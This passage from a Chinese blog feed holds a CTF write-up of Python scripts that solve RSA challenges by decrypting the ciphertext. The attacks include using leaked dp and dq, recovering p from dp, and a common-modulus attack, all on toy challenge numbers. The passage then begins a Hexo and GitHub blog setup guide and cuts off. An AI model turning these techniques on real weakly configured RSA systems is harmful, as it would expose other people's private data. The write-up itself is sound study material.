class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"><span class="comment">#1.求d</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#2.求n</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20201004194955531.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-2-已知c、q、n、e，求明文m"><a href="#4-2-2-已知c、q、n、e，求明文m" class="headerlink" title="4.2.2 已知c、q、n、e，求明文m"></a>4.2.2 已知c、q、n、e，求明文m</h3><p><a href="https://www.cnblogs.com/shenshuoyaoyouguang/p/14025343.html">参考文章</a><br>给了 c, q, n ,e</p><p>求 p : n//q</p><p>求 d: d = invmod(e,(p-1)*(q-1))</p><p>求 flag : flag = pow(c,d,n)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span></span><br><span class="line">q = <span class="number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span></span><br><span class="line">c = <span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line">i = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(libnum.n2s(i))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201129000806367.png" alt="在这里插入图片描述"></p><h3 id="4-3-已知n、e、密文c，求明文m"><a href="#4-3-已知n、e、密文c，求明文m" class="headerlink" title="4.3 已知n、e、密文c，求明文m"></a>4.3 已知n、e、密文c，求明文m</h3><p><strong>[ctfshow]easyrsa1</strong><br><img src="https://img-blog.csdnimg.cn/20201004200123150.png#pic_center" alt="在这里插入图片描述"><br>分解质因数n<br><img src="https://img-blog.csdnimg.cn/202010042038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1455925529734358105461406532259911790807347616464991065301847</span></span><br><span class="line">c = <span class="number">69380371057914246192606760686152233225659503366319332065009</span></span><br><span class="line"><span class="comment">#1.将n分解为p和q</span></span><br><span class="line">p = <span class="number">1201147059438530786835365194567</span></span><br><span class="line">q = <span class="number">1212112637077862917192191913841</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>) </span><br><span class="line"><span class="comment">#2.求d</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">m = gmpy2.powmod(c,d,n) </span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/202010042008171.png#pic_center" alt="在这里插入图片描述"><br>注：<br>1.在线分解质因数：<a href="http://www.factordb.com/">http://www.factordb.com</a> </p><p>2.代码中涉及到了<a href="https://blog.csdn.net/xc_zhou/article/details/82079762">python之binascii模块</a>相关知识</p><h3 id="4-4-已知public-key、密文c，求明文m"><a href="#4-4-已知public-key、密文c，求明文m" class="headerlink" title="4.4 已知public key、密文c，求明文m"></a>4.4 已知public key、密文c，求明文m</h3><p> <strong>[BUUCTF]RSA</strong><br>下载附件<br><img src="https://img-blog.csdnimg.cn/20201011162231603.png#pic_center" alt="在这里插入图片描述"><br>用记事本打开pub.key<br><img src="https://img-blog.csdnimg.cn/20201011162321313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://tool.chacuo.net/cryptrsakeyparse">解析公钥</a><br><img src="https://img-blog.csdnimg.cn/20201011162453842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>模数和指数即为n和e，还需要把n从十六进制转换为十进制<br><img src="https://img-blog.csdnimg.cn/20201011162645687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://www.factordb.com/">分解n</a>，得到p和q</p><p><img src="https://img-blog.csdnimg.cn/20201011162813249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接下来就是通过脚本求出明文m</p><p>脚本需要用到python的rsa库，在cmd中输入<code>pip install rsa</code>即可完成安装<br><img src="https://img-blog.csdnimg.cn/20201011163120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"> </span><br><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line"> </span><br><span class="line">key=rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f=f.read()</span><br><span class="line">    print(rsa.decrypt(f,key))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201011163224705.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-5-已知p、q、dp、dq、c求明文m"><a href="#4-5-已知p、q、dp、dq、c求明文m" class="headerlink" title="4.5 已知p、q、dp、dq、c求明文m"></a>4.5 已知p、q、dp、dq、c求明文m</h3><p><strong>[BUUCTF]RSA1</strong></p><p>这道题属于已知p、q、dp、dq、c求明文类型<br><img src="https://img-blog.csdnimg.cn/20201005193829462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">上脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(m))                  <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20201005194550372.png#pic_center" alt="在这里插入图片描述"><br>然后将16进制转换成字符串</p><p><img src="https://img-blog.csdnimg.cn/20201005194804576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-6已知n、e、dp、c，求m"><a href="#4-6已知n、e、dp、c，求m" class="headerlink" title="4.6已知n、e、dp、c，求m"></a>4.6已知n、e、dp、c，求m</h3><p><strong>[BUUCTF]RSA2</strong></p><p>下载附件，题目给出公钥n,e以及dp<br><img src="https://img-blog.csdnimg.cn/20201011163855598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp=d%(p-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">import</span>  rsa</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp=<span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">n=<span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">temp=dp*e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e) :</span><br><span class="line">    <span class="keyword">if</span> (temp-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        x=(temp-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">        y=n%x</span><br><span class="line">        <span class="keyword">if</span> y==<span class="number">0</span>:</span><br><span class="line">            p=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q=n//p</span><br><span class="line"><span class="comment">#&#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮点数</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">key=rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#unhexlify()的作用是返回16进制数对应的字符串</span></span><br></pre></td></tr></table></figure><p>运行结果<br><img src="https://img-blog.csdnimg.cn/20201011164021212.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-7共模攻击"><a href="#4-7共模攻击" class="headerlink" title="4.7共模攻击"></a>4.7共模攻击</h3><p><strong>[BUUCTF]RSA3</strong><br>出现两个加密使用相同的模，可以在不知道私钥的情况下得到明文，这就是RSA中的<strong>共模攻击</strong>。<br><img src="https://img-blog.csdnimg.cn/20201011164858631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">  c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">  c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">  e1 = <span class="number">11187289</span></span><br><span class="line">  e2 = <span class="number">9647291</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  print(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行脚本，得到明文m<br><img src="https://img-blog.csdnimg.cn/20201011164737363.png#pic_center" alt="在这里插入图片描述"><br>转16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>c61677b34396439313037376131616263623134663161396435343663383062653965667d</span><br></pre></td></tr></table></figure><p>十六进制转字符串<br><img src="https://img-blog.csdnimg.cn/20201109201954658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m"><a href="#4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m" class="headerlink" title="4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m"></a>4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m</h3><p><strong>[GUET-CTF2019]BabyRSA</strong><br><img src="https://img-blog.csdnimg.cn/20210201110739494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>已知<code>p+q</code>、<code>（p+1)(q+1</code>)、<code>e</code>、<code>d</code>,以及密文<code>c</code>.</p><p>利用 RSA的解密公式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M=C^d  mod n</span><br><span class="line">n = p*q</span><br></pre></td></tr></table></figure><p>所以推算出求n的公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = (p+<span class="number">1</span>)*(q+<span class="number">1</span>) - (p+q) - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">b = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c= <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = b-a-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(m))  <span class="comment">#（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20210201111109395.png" alt="在这里插入图片描述"></p><hr><p>看到一份来自漏斗社区的<a href="https://www.freebuf.com/column/148898.html">RSA解题思路思维导图</a>，收藏起来8。</p><p><img src="https://img-blog.csdnimg.cn/20201004175237397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：做题遇到的一些RSA脚本&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="https://swhat.github.io/categories/CTF/CRYPTO/"/>
    
    
    <category term="RSA" scheme="https://swhat.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>个人博客搭建历程</title>
    <link href="https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
    <id>https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</id>
    <published>2020-02-04T06:59:23.000Z</published>
    <updated>2021-03-31T09:56:19.397Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：使用Hexo+github搭建博客</p> <a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>1、hexo<br>2、Node.js<br>3、Git<br>4、GitHub</p><h2 id="注册Github和配置"><a href="#注册Github和配置" class="headerlink" title="注册Github和配置"></a>注册Github和配置</h2><p>官网：<a href="https://github.com/">https://github.com/</a></p><p><strong>1.注册账号</strong><br><img src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.新建仓库</strong><br>新建一个储存仓库，username为github用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username.github.io</span><br></pre></td></tr></table></figure><p>在主页右上角，点击加号，找到<code>New repository</code>，点进去会显示如下界面，输入仓库名，点击创建</p><p>Repository name格式推荐写成<code>username.github.io</code>,点击Create repository<br><img src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>一路next，打开cmd命令行，成功页面如下<br><img src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开Git-Bash工具 ，初始化Git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.配置用户名</span><br><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line"><span class="comment">#用户名可以不是Github用户名，为了方便，设置一致。</span></span><br><span class="line">2.配置邮箱</span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">3.查看已配置的用户信息</span><br><span class="line">git config --global list</span><br></pre></td></tr></table></figure><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br><img src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>打开cmd，进入文件目录，安装成功如下<br><img src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了加快速度，npm换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\nodejs&gt;npm config <span class="built_in">set</span> registry 